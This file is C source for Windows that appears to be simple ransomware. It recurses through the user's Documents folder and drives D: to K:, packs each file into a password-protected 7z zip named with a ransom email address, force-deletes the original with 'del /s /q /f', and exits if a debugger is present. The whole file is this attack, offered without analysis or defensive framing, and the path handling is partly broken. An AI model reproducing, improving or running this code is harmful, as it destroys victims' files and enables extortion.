#include "stdio.h"
#include "windows.h"
#include "stdlib.h"
#define MAX_PATH 500
void find(char * lpPath)
{
char szFind[MAX_PATH],szFile[MAX_PATH];
WIN32_FIND_DATA FindFileData;
strcpy(szFind,lpPath);
strcat(szFind,"\\*.*");HANDLE hFind=FindFirstFile(szFind,&FindFileData);
if(INVALID_HANDLE_VALUE == hFind)
return;
while(TRUE)
{
if(FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
{
     if(FindFileData.cFileName[0]!='.')
     {
        strcpy(szFile,lpPath);
        strcat(szFile,"\\");
        strcat(szFile,FindFileData.cFileName);
        find(szFile);
     }
}
else
{
	char s_filename[MAX_PATH];//加密前文件 
	char e_filename[MAX_PATH];//加密后文件 
	char command1[MAX_PATH]="7z a -tzip ";
	char command2[MAX_PATH]="del /s /q /f ";
	strcpy(e_filename,lpPath);
	strcat(e_filename,FindFileData.cFileName);
	strcat(e_filename,".[getmypwd@foxmail.com].Encrypted");//合并加密后文件的完整路径 
	strcpy(s_filename,lpPath);
	strcat(s_filename,FindFileData.cFileName);//合并加密前文件的完整路径
	strcat(command1,"\"");
	strcat(command1,e_filename);
	strcat(command1,"\"");
	strcat(command1," ");
	strcat(command1,"\"");
	strcat(command1,s_filename);
	strcat(command1,"\"");
	strcat(command1," -pZGVjcnlwdEBieXRlY2VydC5jbg=="); 
	strcat(command2," ");
	strcat(command2,"\"");
	strcat(command2,s_filename);
	strcat(command2,"\"");
	system(command1); 
	system(command2);
	
	
	strcat(szFile,"\\");
	
	
	//printf("%s\n",e_filename);
    //printf("%s\n",s_filename);
    //printf("%s\n",command1);
    //printf("%s\n",command2);
   
}
if(!FindNextFile(hFind,&FindFileData))
     break;
}
}
int main()
{
if (IsDebuggerPresent())
    ExitProcess(-1);
char filepath[MAX_PATH]="C:\\Users\\Administrator\\Documents";
find(filepath);
strcpy(filepath,"D:");
find(filepath);
strcpy(filepath,"E:");
find(filepath);
strcpy(filepath,"F:");
find(filepath);
strcpy(filepath,"G:");
find(filepath);
strcpy(filepath,"H:");
find(filepath);
strcpy(filepath,"I:");
find(filepath);
strcpy(filepath,"J:");
find(filepath);
strcpy(filepath,"K:");
find(filepath);

system("taskkill /im 7z.exe /f");
return 0;
}    
